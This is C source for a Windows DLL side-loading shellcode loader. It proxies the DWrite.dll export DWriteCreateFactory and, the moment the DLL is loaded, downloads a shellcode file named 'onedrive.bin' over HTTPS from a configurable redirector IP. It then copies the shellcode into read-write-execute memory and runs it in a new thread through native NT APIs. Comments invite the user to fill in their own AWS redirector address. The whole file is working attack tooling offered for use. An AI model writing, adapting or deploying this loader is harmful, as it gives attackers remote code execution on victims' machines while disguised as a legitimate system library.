#pragma once
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>

#pragma comment(lib, "ntdll")
#pragma comment(lib, "winhttp.lib")
#pragma comment(linker, "/export:DWriteCreateFactory=C:\\Windows\\System32\\DWrite.DWriteCreateFactory,@1")

// Configuration - Replace with your redirectorâ€™s public IP
char ip[] = "3.3.3.3";          // Your AWS redirector public IP
char port[] = "443";            // HTTPS port
char resource[] = "onedrive.bin"; // Shellcode file

#define NtCurrentProcess() ((HANDLE)-1)
#define DEFAULT_BUFLEN 4096
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// NTAPI function declarations for shellcode execution
EXTERN_C NTSTATUS NtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

EXTERN_C NTSTATUS NtProtectVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG NewProtect,
    OUT PULONG OldProtect
);

EXTERN_C NTSTATUS NtCreateThreadEx(
    OUT PHANDLE hThread,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN PVOID lpStartAddress,
    IN PVOID lpParameter,
    IN ULONG Flags,
    IN SIZE_T StackZeroBits,
    IN SIZE_T SizeOfStackCommit,
    IN SIZE_T SizeOfStackReserve,
    OUT PVOID lpBytesBuffer
);

EXTERN_C NTSTATUS NtWaitForSingleObject(
    IN HANDLE Handle,
    IN BOOLEAN Alertable,
    IN PLARGE_INTEGER Timeout
);

// Function to fetch and execute shellcode over HTTPS
void getShellcode_Run(char* host, char* port, char* resource) {
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer = NULL;
    BOOL bResults = FALSE;
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;

    // Convert host and resource to wide strings for WinHTTP
    wchar_t wHost[100];
    MultiByteToWideChar(CP_ACP, 0, host, -1, wHost, 100);
    wchar_t wResource[100];
    MultiByteToWideChar(CP_ACP, 0, resource, -1, wResource, 100);

    // Initialize WinHTTP session
    hSession = WinHttpOpen(L"Shellcode Loader", 
                           WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
                           WINHTTP_NO_PROXY_NAME, 
                           WINHTTP_NO_PROXY_BYPASS, 
                           0);
    if (!hSession) {
        printf("WinHttpOpen failed with error: %ld\n", GetLastError());
        return;
    }

    // Connect to the redirector
    hConnect = WinHttpConnect(hSession, wHost, atoi(port), 0);
    if (!hConnect) {
        printf("WinHttpConnect failed with error: %ld\n", GetLastError());
        WinHttpCloseHandle(hSession);
        return;
    }

    // Create an HTTPS GET request
    hRequest = WinHttpOpenRequest(hConnect, 
                                  L"GET", 
                                  wResource, 
                                  NULL, 
                                  WINHTTP_NO_REFERER, 
                                  WINHTTP_DEFAULT_ACCEPT_TYPES, 
                                  WINHTTP_FLAG_SECURE); // Enable SSL
    if (!hRequest) {
        printf("WinHttpOpenRequest failed with error: %ld\n", GetLastError());
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return;
    }

    // Send the request
    bResults = WinHttpSendRequest(hRequest, 
                                  WINHTTP_NO_ADDITIONAL_HEADERS, 
                                  0, 
                                  WINHTTP_NO_REQUEST_DATA, 
                                  0, 
                                  0, 
                                  0);
    if (!bResults) {
        printf("WinHttpSendRequest failed with error: %ld\n", GetLastError());
    } else {
        bResults = WinHttpReceiveResponse(hRequest, NULL);
        if (!bResults) {
            printf("WinHttpReceiveResponse failed with error: %ld\n", GetLastError());
        }
    }

    // Receive the shellcode
    if (bResults) {
        do {
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
                printf("WinHttpQueryDataAvailable failed with error: %ld\n", GetLastError());
                break;
            }
            if (dwSize == 0) break;

            pszOutBuffer = (LPSTR)malloc(dwSize + 1);
            if (!pszOutBuffer) {
                printf("Memory allocation failed\n");
                break;
            }
            ZeroMemory(pszOutBuffer, dwSize + 1);

            if (WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) {
                printf("[+] Received %ld Bytes\n", dwDownloaded);

                // Allocate memory and execute shellcode
                PVOID shellcodeAddr = NULL;
                SIZE_T shellcodeSize = dwDownloaded;
                NTSTATUS status = NtAllocateVirtualMemory(NtCurrentProcess(), 
                                                         &shellcodeAddr, 
                                                         0, 
                                                         &shellcodeSize, 
                                                         MEM_COMMIT | MEM_RESERVE, 
                                                         PAGE_EXECUTE_READWRITE);
                if (NT_SUCCESS(status)) {
                    memcpy(shellcodeAddr, pszOutBuffer, dwDownloaded);
                    HANDLE hThread;
                    status = NtCreateThreadEx(&hThread, 
                                             THREAD_ALL_ACCESS, 
                                             NULL, 
                                             NtCurrentProcess(), 
                                             (LPTHREAD_START_ROUTINE)shellcodeAddr, 
                                             NULL, 
                                             0, 
                                             0, 
                                             0, 
                                             0, 
                                             NULL);
                    if (NT_SUCCESS(status)) {
                        printf("[+] Shellcode executed\n");
                        NtWaitForSingleObject(hThread, FALSE, NULL);
                        CloseHandle(hThread);
                    } else {
                        printf("NtCreateThreadEx failed with status: 0x%08x\n", status);
                    }
                } else {
                    printf("NtAllocateVirtualMemory failed with status: 0x%08x\n", status);
                }
            } else {
                printf("WinHttpReadData failed with error: %ld\n", GetLastError());
            }
            free(pszOutBuffer);
            pszOutBuffer = NULL;
        } while (dwSize > 0);
    }

    // Cleanup
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
}

// DLL entry point
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        getShellcode_Run(ip, port, resource);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
